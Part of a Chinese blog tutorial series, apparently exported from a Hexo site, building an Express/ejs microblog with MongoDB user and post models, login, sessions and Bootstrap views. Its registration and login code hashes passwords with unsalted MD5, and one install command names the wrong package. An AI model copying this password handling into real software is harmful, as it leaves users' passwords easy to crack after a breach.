'两次输入的口令不一致'); return res.redirect('/reg'); &#125; // 生成口令的散列值 var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); var newUser = new User(&#123; name: req.body.username, password: password, &#125;); // 检查用户名是否存在 User.get(newUser.name, function (err, user) &#123; if (user) &#123; err = "Username is already exists." &#125; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; // 如果不存在则新增用户 newUser.save(function (err) &#123; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; req.session.user = newUser; req.flash('success', '注册成功'); res.redirect('/reg'); &#125;); &#125;);&#125;); req.body 就是 POST 请求信息解析过后的对象，例如我们要访问用户传递的 password 域的值，只需访问 req.body[‘password’] 即可 req.flash 是 Express 提供的一个奇妙的工具，通过它可以保存的变量只会在用户当前和下一次的请求中被访问，之后就会被清除掉，通过它可以很方便地实现页面的通知和错误消息显示功能 res.redirect 是重定向功能，通过它会向用户返回一个 303 See Other 状态，通知浏览器转向相应页面。 crypto 是 Node.js 的一个核心模块，功能是加密并生成各种散列，使用它之前首先要声明 var crypto = require(‘crypto’) User 是设计的用户对象，后面会详细介绍。 User.get 的功能是通过用户名获取已知用户，在这里我们判断用户名是否已经存在。 User.save 可以将用户对象的修改写入数据库。 通过 req.session.user = newUser 向会话对象写入了当前用户的信息。 用户模型在前面的代码中，我们直接使用了 User 对象。 User 是一个描述数据的对象，即 MVC架构中的模型。前面我们使用了许多视图和控制器，这是第一次接触到模型。与视图和控制器不同，模型是真正与数据打交道的工具，没有模型，网站就只是一个外壳，不能发挥真实的作用，因此它是框架中最根本的部分。现在就让我们来实现 User 模型吧。 在 models 目录中创建 user.js 的文件，内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var mongodb = require('./db');function User(user) &#123; this.name = user.name; this.password = user.password;&#125;;module.exports = User;/* * 保存一个用户到数据库 * @param &#123;Function&#125; callback: 执行完数据库操作的应该执行的回调函数 */User.prototype.save = function save(callback) &#123; // 存入 Mongodb 的文档 var user = &#123; name: this.name, password: this.password, &#125;; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // 读取 users 集合 db.collection('users', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; //为name属性添加索引，新版本的ensureIndex方法需要一个回调函数 collection.ensureIndex('name', &#123; unique: true &#125;); //写入user文档 collection.insert(user, &#123; safe: true &#125;, function (err, user) &#123; mongodb.close(); callback(err, user); &#125;); &#125;); &#125;);&#125;/* * 查询在集合`users`是否存在一个制定用户名的用户 * @param &#123;String&#125; username: 需要查询的用户的名字 * @param &#123;Function&#125; callback: 执行完数据库操作的应该执行的回调函数 */User.get = function get(username, callback) &#123; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // 读取 users 集合 db.collection('users', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; // 查找 name 属性为 username 的文档 collection.findOne(&#123; name: username &#125;, function (err, doc) &#123; mongodb.close(); if (doc) &#123; // 封装文档为 User 对象 var user = new User(doc); callback(err, user); &#125; else &#123; callback(err, null); &#125; &#125;); &#125;); &#125;);&#125;; 以上代码实现了两个接口， User.prototype.save 和 User.get， 前者是对象实例的方法，用于将用户对象的数据保存到数据库中，后者是对象构造函数的方法，用于从数据库中查找指定的用户。 视图交互现在几乎已经万事俱备，只差视图的支持了。为了实现不同登录状态下页面呈现不同内容的功能，我们需要创建动态视图助手，通过它我们才能在视图中访问会话中的用户数据。同时为了显示错误和成功的信息，也要在动态视图助手中增加响应的函数。打开 app.js，添加以下代码： 123var flash = require('connect-flash');// 在路由后面配置app.use(flash()); 然后在 routes/index.js 里面添加 12345678910router.use(function (req, res, next) &#123; res.locals.user=req.session.user; var err = req.flash('error'); var success = req.flash('success'); res.locals.error = err.length ? err : null; res.locals.success = success.length ? success : null; next();&#125;); 修改 header.ejs 中的导航部分 123456789&lt;ul class=&quot;nav&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;% if (!user) &#123; %&gt; &lt;li&gt;&lt;a href=&quot;/login&quot;&gt;登入&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/reg&quot;&gt;注册&lt;/a&gt;&lt;/li&gt; &lt;% &#125; else &#123; %&gt; &lt;li&gt;&lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt;&lt;/li&gt; &lt;% &#125; %&gt;&lt;/ul&gt; 上面功能是为已登入用户和未登入用户显示不同的信息。在 container 中， &lt;%- body %&gt;之前加入： 12345678910&lt;% if (success) &#123; %&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;%= success %&gt; &lt;/div&gt;&lt;% &#125; %&gt;&lt;% if (error) &#123; %&gt; &lt;div class=&quot;alert alert-error&quot;&gt; &lt;%= error %&gt; &lt;/div&gt;&lt;% &#125; %&gt; 它的功能是页面通知。 下面分别是注册时遇到错误和注册成功以后的画面。 登入和登出完成用户注册的功能以后再实现用户登入和登出就相当容易了。把下面的代码加到 routes/index.js 中： 12345678910111213141516171819202122// 用户登录router.get('/login', function (req, res, next) &#123; res.render('login', &#123; title: '用户登录' &#125;);&#125;);router.post('/login', function (req, res, next) &#123; // 生成口令的散列值 var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); User.get(req.body.username, function (err, user) &#123; if (!user) &#123; req.flash('error', '用户不存在'); return res.redirect('/login'); &#125; if (user.password != password) &#123; req.flash('error', '用户口令错误'); return res.redirect('/login'); &#125; req.session.user = user; req.flash('success', '登入成功'); res.redirect('/'); &#125;);&#125;); 在这里清晰地看出登入和登出仅仅是 req.session.user 变量的标记，非常简单。但这会不会有安全性问题呢？不会的，因为这个变量只有服务端才能访问到，只要不是黑客攻破了整个服务器，无法从外部改动。 创建 views/login.ejs 1234567891011121314151617181920&lt;form class="form-horizontal" method="post"&gt; &lt;fieldset&gt; &lt;legend&gt;用户登入&lt;/legend&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="username"&gt;用户名&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="text" class="input-xlarge" id="username" name="username"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="password"&gt;口令&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="password" class="input-xlarge" id="password" name="password"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="form-actions"&gt; &lt;button type="submit" class="btn btn-primary"&gt;登入&lt;/button&gt; &lt;/div&gt; &lt;/fieldset&gt;&lt;/form&gt; 在浏览器中访问 http://localhost:3000/login 可以看到页面 至此用户注册和登录的功能就完全实现了。 页面权限控制还有一个工作要完成，就是为页面设置访问权限。例如，登出功能应该只对登入的用户开发，注册和登入页面则应该阻止已登入的用户访问。实现这一点，最简单的方法是在每个页面的路由响应函数内检查用户是否已经登录，但这会带来很多重复代码，因此利用路由中间件来实现这个功能。 同一路径绑定多个响应函数的方法，通过调用 next() 转移控制权，这种方法叫做路由中间件。把用户登入状态检查放在路由中间件中，每个路径前增加路由中间件，既可以实现页面权限控制。 routes/index.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// 用户注册router.get('/reg', checkNotLogin);router.get('/reg', function (req, res, next) &#123; res.render('reg', &#123; title: '用户注册' &#125;);&#125;);router.post('/reg', checkNotLogin);router.post('/reg', function (req, res, next) &#123; if (req.body['password-repeat'] != req.body['password']) &#123; req.flash('error', '两次输入的口令不一致'); return res.redirect('/reg'); &#125; // 生成口令的散列值 var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); var newUser = new User(&#123; name: req.body.username, password: password, &#125;); // 检查用户名是否存在 User.get(newUser.name, function (err, user) &#123; if (user) &#123; err = "Username is already exists." &#125; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; // 如果不存在则新增用户 newUser.save(function (err) &#123; if (err) &#123; req.flash('error', err); return res.redirect('/reg'); &#125; req.session.user = newUser; req.flash('success', '注册成功'); res.redirect('/'); &#125;); &#125;);&#125;);// 用户登录router.get('/login', checkNotLogin);router.get('/login', function (req, res, next) &#123; res.render('login', &#123; title: '用户登录' &#125;);&#125;);router.post('/login', checkNotLogin);router.post('/login', function (req, res, next) &#123; // 生成口令的散列值 var md5 = crypto.createHash('md5'); var password = md5.update(req.body.password).digest('base64'); User.get(req.body.username, function (err, user) &#123; if (!user) &#123; req.flash('error', '用户不存在'); return res.redirect('/login'); &#125; if (user.password != password) &#123; req.flash('error', '用户口令错误'); return res.redirect('/login'); &#125; req.session.user = user; req.flash('success', '登入成功'); res.redirect('/'); &#125;);&#125;);// 用户登出 router.get('/logout', checkLogin);router.get('/logout', function (req, res, next) &#123; req.session.user = null; req.flash('success', '登出成功'); res.redirect('/');&#125;);function checkLogin(req, res, next) &#123; if(!req.session.user)&#123; req.flash('error','未登入'); return res.redirect('/login'); &#125; next();&#125;function checkNotLogin(req, res, next)&#123; if(req.session.user)&#123; req.flash('error','已登入'); return res.redirect('/'); &#125; next();&#125; 发表微博现在网站已经具备了用户注册、登入、页面权限控制的功能，这些功能为网站最核心的部分——发表微博做好了准备,我们可以来实现发表微博的功能，完成整个网站的设计。 微博模型从模型设计开始，仿照用户模型，将微博模型命名为 Post 对象，它拥有与 User 相似的接口，分别是 Post.get 和 Post.prototype.save。Post.get 的功能是从数据库中获取微博，可以指定用户获取，也可以获取全部的内容。Post.prototype.save 是 Post 对象实例的方法，用于将对象的变动保存到数据库中。 创建 models/post.js，写入以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687var mongodb = require('./db');function Post(username, post, time) &#123; this.user = username; this.post = post; if (time) &#123; this.time = time; &#125; else &#123; this.time = new Date(); &#125;&#125;module.exports = Post;/* * 保存一条发言到数据库 * @param &#123;Function&#125; callback: 执行完数据库操作的应该执行的回调函数 */Post.prototype.save = function save(callback) &#123; // 存入 Mongodb 的文档 var post = &#123; user: this.user, post: this.post, time: this.time, &#125;; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // 读取 posts 集合 db.collection('posts', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; // 为 user 属性添加索引 // collection.ensureIndex('user'); // 写入 post 文档 collection.insert(post, &#123; safe: true &#125;, function (err, post) &#123; mongodb.close(); callback(err, post); &#125;); &#125;); &#125;);&#125;;/* * 查询一个用户的所有发言 * @param &#123;String&#125; username: 需要查询的用户的名字 * @param &#123;Function&#125; callback: 执行完数据库操作的应该执行的回调函数 */Post.get = function get(username, callback) &#123; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // 读取 posts 集合 db.collection('posts', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; // 查找 user 属性为 username 的文档，如果 username 是 null 则匹配全部 var query = &#123;&#125;; if (username) &#123; query.user = username; &#125; collection.find(query).sort(&#123; time: -1 &#125;).toArray(function (err, docs) &#123; mongodb.close(); if (err) &#123; callback(err, null); &#125; // 封装 posts 为 Post 对象 var posts = []; docs.forEach(function (doc, index) &#123; var post = new Post(doc.user, doc.post, doc.time); posts.push(post); &#125;); callback(null, posts); &#125;); &#125;); &#125;);&#125; 在后面我们会通过控制器调用这个模块。 发表微博通过 POST 方法访问 /post 以发表微博，现在来实现这个控制器。在 routes/index.js 中添加下面的代码： 1234567891011121314// 用户发表微博router.post('/post', checkLogin);router.post('/post', function (req, res) &#123; var currentUser = req.session.user; var post = new Post(currentUser.name, req.body.post); post.save(function (err) &#123; if (err) &#123; req.flash('error', err); return res.redirect('/'); &#125; req.flash('success', '发表成功'); res.redirect('/u/' + currentUser.name); &#125;);&#125;); 这段代码通过 req.session.user 获取当前用户信息，从 req.body.post 获取用户发表的内容，建立 Post 对象，调用 save() 方法存储信息，最后将用户重定向到用户页面。 在这里会报错，需要在 app.js 引入 bodyParser 1npm i bodyParser 安装后引入，并且运用 1app.use(bodyParser.urlencoded()); 用户页面用户页面的功能是展示用户发表的所有内容，在routes/index.js中加入以下代码： 1234567891011121314151617181920// 用户的主页 router.get('/u/:user', function (req, res) &#123; User.get(req.params.user, function (err, user) &#123; if (!user) &#123; req.flash('error', '用户不存在'); return res.redirect('/'); &#125; Post.get(user.name, function (err, posts) &#123; console.log(posts); if (err) &#123; req.flash('error', err); return res.redirect('/'); &#125; res.render('user', &#123; title: user.name, posts: posts, &#125;); &#125;); &#125;);&#125;); 它的功能是首先检查用户是否存在，如果存在则从数据库中获取该用户的微博，最后通过 posts 属性传递给 user 视图。views/user.ejs 的内容如下： 1234&lt;% if (user) &#123; %&gt; &lt;% include say.ejs %&gt;&lt;% &#125; %&gt;&lt;% include posts.ejs %&gt; 根据 DRY 原则，我们把重复用到的部分都提取出来，分别放入 say.ejs 和 posts.ejs。say.ejs的功能是显示一个发表微博的表单，它的内容如下： 123456&lt;form method="post" action="/post" class="well form-inline center" style="text-align:center;"&gt; &lt;input type="text" class="span8" name="post"&gt; &lt;button type="submit" class="btn btn-success"&gt;&lt;i class="icon-comment icon-white"&gt; &lt;/i&gt; 发言&lt;/button&gt;&lt;/form&gt; posts.ejs 的目的是按照行列显示传入的 posts 的所有内容： 12345678910111213141516&lt;% posts.forEach(function(post, index) &#123; if (index % 3 == 0) &#123; %&gt; &lt;div class=&quot;row&quot;&gt; &lt;%&#125; %&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;&lt;a href=&quot;/u/&lt;%= post.user %&gt;&quot;&gt;&lt;%= post.user %&gt;&lt;/a&gt; 说&lt;/h2&gt; &lt;p&gt;&lt;small&gt;&lt;%= post.time %&gt;&lt;/small&gt;&lt;/p&gt; &lt;p&gt;&lt;%= post.post %&gt;&lt;/p&gt; &lt;/div&gt; &lt;% if (index % 3 == 2) &#123; %&gt; &lt;/div&gt;&lt;!-- end row --&gt; &lt;% &#125; %&gt; &lt;%&#125;) %&gt; &lt;% if (posts.length % 3 != 0) &#123; %&gt;&lt;/div&gt;&lt;!-- end row --&gt;&lt;%&#125; %&gt; 完成上述工作后，重启服务器。在用户的页面上发表几个微博，可以看到以下效果 首页最后一步是实现首页的内容。我们计划在首页显示所有用户发表的微博，按时间从新到旧的顺序。 在 routes/index.js 中添加下面代码： 12345678910111213// 正式微博路由router.get('/', function (req, res, next) &#123; Post.get(null, function (err, posts) &#123; if (err) &#123; posts = []; &#125; res.render('index', &#123; title: '首页', posts: posts, user: req.session.user, &#125;); &#125;);&#125;); 它的功能是读取所有用户的微博，传递给页面 posts 属性。接下来修改首页的模板index.ejs： 12345678910111213141516&lt;% include header.ejs %&gt;&lt;% if (!user) &#123; %&gt;&lt;div class=&quot;hero-unit&quot;&gt; &lt;h1&gt;欢迎来到 Microblog&lt;/h1&gt; &lt;p&gt;Microblog 是一个基于 Node.js 的微博系统。&lt;/p&gt; &lt;p&gt; &lt;a class=&quot;btn btn-primary btn-large&quot; href=&quot;/login&quot;&gt;登录&lt;/a&gt; &lt;a class=&quot;btn btn-large&quot; href=&quot;/reg&quot;&gt;立即注册&lt;/a&gt; &lt;/p&gt;&lt;/div&gt;&lt;% &#125; else &#123; %&gt; &lt;% include say.ejs %&gt;&lt;% &#125; %&gt;&lt;% include posts.ejs %&gt;&lt;% include footer.ejs %&gt; 可以看到首页效果如下 到这里就初步完成了一个基本博客的模型，完整的源码可以到 https://github.com/LbhFront-end/LearnNodeJsCode 查看。有问题的可以互相交流]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— 使用 Node.js进行 Web 开发（中）]]></title>
    <url>%2F2018-09-27-NodeJs-Part5%E4%B8%AD.html</url>
    <content type="text"><![CDATA[不知不觉，已经过去快一个星期没有继续更新了，中秋假日总会使人想安于现状，这一章继续上面使用 Node.js 进行 Web 开发，介绍模板引擎，尝试建立一个微博网站，实现用户注册登录和发表微博的基础功能。好了，让我们一起开始吧 使用 Node.js 进行 Web 开发（中）模板引擎Express 的路由控制，是网络架构最核心的部分，即 MVC 架构中的控制器。而视图，主要是通过模板引擎的使用和集成来实现。视图决定了用户最终看到的东西，也是最重要的部分，这里以 ejs 为例介绍模板引擎的使用方法。 什么是模板引擎模板引擎（Template Engine） 是一个从页面模板根据一定的规则生成的 HTML 的工具。按照这种模式，整个网站就由一个个页面模块组成，所有的逻辑都嵌入在模块中，这种模式大大降低动态网页开发的门槛，但随着规模的扩大会遇到许多问题。 页面功能逻辑与页面布局样式耦合，网站模式变大以后逐渐难以维护 语法复杂，对于非技术的网页设计者来说门槛较高，难以学习。 功能过于全面，页面设计者可以在页面上编程，不利于功能划分，也使模板解析效率降低。 这些问题制约了早期模板引擎的发展，直到 MVC 开发模式普及，模板引擎才开始遍地开花。现代的模板引擎是 MVC 的一部分，在功能划分上它严格属于视图部分，因此功能以生存 HTML 页面为核心，不会引入过多的编程语言的功能。 模板引擎的功能主要是将页面模块和要显示的数据结合起来生成 HTML 页面。它既可以运行在服务器端又可以运行在客户端，大多数时候它都在服务器端直接被解析成 HTML ，解析完成后再传输给客户端，因为客户端甚至无法判断页面是否是模板引擎生成的。有时候模板引擎也可以而运行在客户端，即浏览器中，典型的代表就是 XSLT，它以 XML 为输入，在客户端生成 HTML 页面。但是由于浏览器兼容性问题，XSLT 并不是很流行。目前的主流还是由服务器运行模板引擎。 在MVC架构中，模板引擎包含在服务器端。控制器得到用户请求后，从模型获取数据，调用模板引擎。模板引擎以数据和页面模板输入，生成 HTML 页面，然后返回控制器，由控制器交给客户端。 使用模板引擎基于 JavaScript 的模板引擎有许多种实现。推荐使用 ejs （Embedded JavaScript），因为它十分简单而且与 Express 集成良好。由于它是标准 JavaScript 实现的，因此它不仅可以运行在服务器端，还可以运行在浏览器中。 app.js 中通过以下两个语句设置了模板引擎和页面模板的位置： 123// view engine setupapp.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs'); 表明要使用的模板引擎是 ejs ,页面模板在 views 子目录下。在 routes/index.js 用一下语句，绑定路由和调用模板引擎。 1234567var express = require('express');var router = express.Router();/* GET home page. */router.get('/', function (req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;); res.render 的功能是调用模板引擎，并将其产生的页面直接返回给客户端。它接受两个参数，第一个是模板的名称，即 views 目录下的模板文件名，不包含文件的扩展名；第二个参数是传递给模板的数据，用于模板翻译。index.ejs 内容如下： 12&lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;&lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt; 上面代码其中有两处 &lt;%= title %&gt; ，用于模板变量显示，它们在模板翻译时会被替换成 Express，因为 res.render 传递了 { title: &#39;Express&#39; } 。 ejs 的标签系统非常简单，它只有以下3种标签。 &lt;% code %&gt; ：JavaScript 代码。 &lt;%= code %&gt; ：显示替换过 HTML 特殊字符的内容。 &lt;%- code %&gt; ：显示原始 HTML 内容。 可以用它们实现页面模板系统能实现的任何内容。 页面布局views/index.ejs 里面的代码 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; Express 可以自动套用 layout.ejs ，所以可以将 index.ejs 里面的代码分开 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;%- body %&gt; &lt;/body&gt;&lt;/html&gt; layout.ejs 是一个页面布局模板，它描述了整个页面的框架结构，默认情况下每个单独的页面都继承自这个框架，替换掉 &lt;%- body %&gt; 部分。这个功能通常非常有用，因为一般为了保持整个网站的一致风格，HTML 页面的 &lt;head&gt; 部分以及页眉页脚中的大量内容是重复的，因此我们可以把它们放在 layout.ejs 中。当然，这个功能并不是强制的，如果想关闭它，可以在 app.js 的中 app.configure 中添加以下内容，这样页面布局功能就被关闭了。 123app.set('view options', &#123; layout: false&#125;); 另一种情况是，一个网站可能需要不止一种页面布局，例如网站分前台展示和后台管理系统，两者的页面结构有很大的区别，一套页面布局不能满足需求。这时我们可以在页面模板翻译时指定页面布局，即设置 layout 属性，例如： 123456function(req, res) &#123; res.render('userlist', &#123; title: '用户列表后台管理系统', layout: 'admin' &#125;);&#125;; 这段代码会在翻译 userlist 页面模板时套用 admin.ejs 作为页面布局。 片段视图Express 的视图系统还支持片段视图（partials），它就是一个页面的片段，通常是重复的内容，用于迭代显示。它就是一个页面的片段，通常是重复的内容，用于迭代显示。通过它你可以将相对独立的页面块分割出去，而且可以避免显式地使用 for 循环。而其实在 Express4.0以后，已经开始用 include 来取代 partials 了。 如果仍要用的话，可以采用以下步骤： 运行cmd 输入:npm install express-partials -g 下载成功后.在app.js 中引用此插件 var partials = require(‘express-partials’); 开启此插件, 在app.js 中 app.set(‘view engine’, ‘ejs’); 代码后添加如下代码: app.use(partials()); 不过这里，我还是用新的方法，首先在 routers/index.js 中新增以下内容。 123456router.get('/list', function (req, res, next) &#123; res.render('list', &#123; title: 'List', items: [1995, 'lbh', 'express', 'Node.js'] &#125;);&#125;); 接着在 views目录下新建 list.ejs 内容是 12345&lt;ul&gt; &lt;% items.forEach(function(listitem)&#123;%&gt; &lt;% include listitem%&gt; &lt;%&#125;) %&gt;&lt;/ul&gt; 同时建立 listitem.ejs 内容是 1&lt;li&gt;&lt;%= listitem %&gt;&lt;/li&gt; 访问 http://localhost:3000/list，可以在源代码中看到以下内容： 1234567891011121314&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;ul&gt; &lt;li&gt;1995&lt;/li&gt; &lt;li&gt;lbh&lt;/li&gt; &lt;li&gt;express&lt;/li&gt; &lt;li&gt;Node.js&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt; 视图助手Express 提供了一种叫做视图助手的工具，它的功能是允许在视图中访问一个全局的函数或对象，不用每次调用视图解析的时候单独传入。前面提到的 partial 就是一个视图助手。 视图助手有两类，分别是静态视图助手和动态视图助手。这两者的差别在于，静态视图助手可以是任何类型的对象，包括接受任意参数的函数，但访问到的对象必须是与用户请求无关的，一般指的是项目的名称，地址等配置参数或者是公共的方法，这些变量，方法只能用在模板视图里面。动态视图助手指的是该视图变量，方法与请求有关，一般用来解析请求信息，如用户登录信息，请求地址等。 静态视图助手可以通过 app.helpers() 函数注册，它接受一个对象，对象的每个属性名称为视图助手的名称，属性值对应视图助手的值。动态视图助手则通过 app.dynamicHelpers() 注册，方法与静态视图助手相同，但每个属性的值必须为一个函数，该函数提供 req 和 res 。当然这是express4.0之前的用法，现在视图助手有所不一样了。 静态视图在 app.js 中添加 123456// app 静态视图助手// 静态视图助手变量app.locals.appName = 'NodeExpressBlog';app.locals.sayHello = function()&#123; return 'Welcome to my NodeExpressBlog';&#125; 新建一个 helper.ejs,内容如下： 12&lt;h1&gt;&lt;%= appName%&gt;&lt;/h1&gt;&lt;p&gt;&lt;%= sayHello()%&gt;&lt;/p&gt; 访问 http://localhost:3000/helper 可以看到下面内容 动态视图动态视图助手的实现方式和路由的方式相似，所以动态视图助手要将语句放在路由的前面 在 routers/index.js 里面添加以下内容 12345678// 动态视图助手router.use(function(req, res, next)&#123; res.locals.appUrl = req.url; res.locals.Welcome = function()&#123; return 'Welcome to my NodeExpressBlog, the url is: ' + res.locals.appUrl; &#125; next();&#125;); 然后在 helper.ejs 添加以下内容 12&lt;p&gt;&lt;%= appUrl %&gt;&lt;/p&gt;&lt;p&gt;&lt;%= Welcome() %&gt;&lt;/p&gt; 刷新网页，可以看到以下内容 视图助手的本质其实就是给所有视图注册了全局变量，因此无需每次在调用模板引擎时传递数据对象。 接下来 在 app.js 中加入 1234var util = require('util');app.locals.inspect = function(obj)&#123; return util.inspect(obj, true);&#125; 然后在 routers/index.js 添加 123456789// 动态视图助手router.use(function(req, res, next)&#123; res.locals.appUrl = req.url; res.locals.Welcome = function()&#123; return 'Welcome to my NodeExpressBlog, the url is: ' + res.locals.appUrl; &#125; res.locals.headers = req.headers; next();&#125;); 同样在 helper.ejs 添加 1&lt;p&gt;&lt;%=inspect(headers)%&gt;&lt;/p&gt; 重开服务器，可以看到 在后面使用 session 时会发现它是非常有用的。 建立微博网站功能分析首先，微博应该以用户为中心，因此需要有用户的注册和登录功能。微博网站最核心的功能是信息的发表，这个功能涉及许多方面，包括数据库访问、前端显示等。一个完整的微博系统应该支持信息的评论、转发、圈点用户等功能，但出于演示目的，我们不能一一实现所有功能，只是实现一个微博社交网站的雏形。 路由规划在完成功能设计以后，下一个要做的事情就是路由规划了。路由规划，或者说控制器规划是整个网站的骨架部分，因为它处于整个架构的枢纽位置，相当于各个接口之间的粘合剂，所以应该优先考虑。 根据功能设计，我们把路由按照以下方案规划。 /：首页 /u/[user]：用户的主页 /post：发表信息 /reg：用户注册 /login：用户登录 /logout：用户登出 以上页面还可以根据用户状态细分。发表信息以及用户登出页面必须是已登录用户才能操作的功能，而用户注册和用户登入所面向的对象必须是未登入的用户。首页和用户主页则针对已登入和未登入的用户显示不同的内容。 修改 routers/index.js 的内容 123456789101112131415161718192021222324252627282930// 正式微博路由router.get('/', function (req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;);// 用户的主页 router.get('/u/:user', function (req, res, next) &#123; &#125;);// 用户注册router.route('/reg'). all(function (req, res, next) &#123; next() &#125;).get(function (req, res, next) &#123; next() &#125;).post(function (req, res, next) &#123; next() &#125;);// 用户登录router.route('/login'). all(function (req, res, next) &#123; next() &#125;).get(function (req, res, next) &#123; next() &#125;).post(function (req, res, next) &#123; next() &#125;);// 用户登出 router.get('/logout', function (req, res, next) &#123; &#125;); 由于/reg 以及 /login 接受表单信息的同时还要显示用户注册要填写的表单，所以使用 router.route方法链式将 post/get 方法写在了一起。 界面设计Twitter Bootstrap 是由 Twitter 的设计师和工程师发起的开源项目，它提供了一套与 Twitter 风格一致的简洁、优雅的 Web UI，包含了完全由 HTML、CSS、JavaScript 实现的用户交互工具。可以轻松地使用Twitter Bootstrap 制作出优美的界面。 使用 Bootstrap从http://twitter.github.com/bootstrap/下载bootstrap.zip，解压后可以看到以下文件： 12345678css/bootstrap-responsive.csscss/bootstrap-responsive.min.csscss/bootstrap.csscss/bootstrap.min.cssimg/glyphicons-halflings-white.pngimg/glyphicons-halflings.pngjs/bootstrap.jsjs/bootstrap.min.js 其中所有的 JavaScript 和 CSS 文件都提供了开发版和产品版，前者是原始的代码，后者经过压缩，文件名中带有 min。将 img 目录复制到工程 public 目录下，将 bootstrap.css、bootstrap-responsive.css 复制到 public/stylesheets 中，将 bootstrap.js 复制到 public/javascripts 目录中，然后从http://jquery.com/下载一份最新版的 jquery.js 也放入 public/javascripts 目录中。 由于 express4.x版本以及不再支持 layout.ejs，而是使用 include 首先我们本来要插入layout.ejs，内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; &lt;%= title %&gt; - Microblog&lt;/title&gt; &lt;link rel='stylesheet' href='/stylesheets/bootstrap.css' /&gt; &lt;link rel='stylesheet' href='/stylesheets/style.css' /&gt; &lt;style type="text/css"&gt; body &#123; padding-top: 60px; padding-bottom: 40px; &#125; &lt;/style&gt; &lt;link href="stylesheets/bootstrap-responsive.css" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="navbar navbar-fixed-top"&gt; &lt;div class="navbar-inner"&gt; &lt;div class="container"&gt; &lt;a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/a&gt; &lt;a class="brand" href="/"&gt;Microblog&lt;/a&gt; &lt;div class="nav-collapse"&gt; &lt;ul class="nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="/login"&gt;登入&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="/reg"&gt;注册&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id="container" class="container"&gt;&lt;/div&gt; &lt;hr /&gt;&lt;footer&gt; &lt;p&gt;&lt;a href="http://laibh.top" target="_blank"&gt;赖同学&lt;/a&gt; 2018&lt;/p&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src="/javascripts/jquery.js"&gt;&lt;/script&gt;&lt;script src="/javascripts/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 上面代码是使用 Bootstrap部件实现的一个简单页面框架，整个页面分为顶部工具栏、正文和页脚三部分，其中正文和页脚包含在名为 container 的 div 标签中。 然后我们新建两个ejs 文件，分别是 footer.ejs 和 header.ejs 123456789101112131415161718192021222324252627282930313233343536373839// header.ejs &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; &lt;%= title %&gt; - Microblog&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; 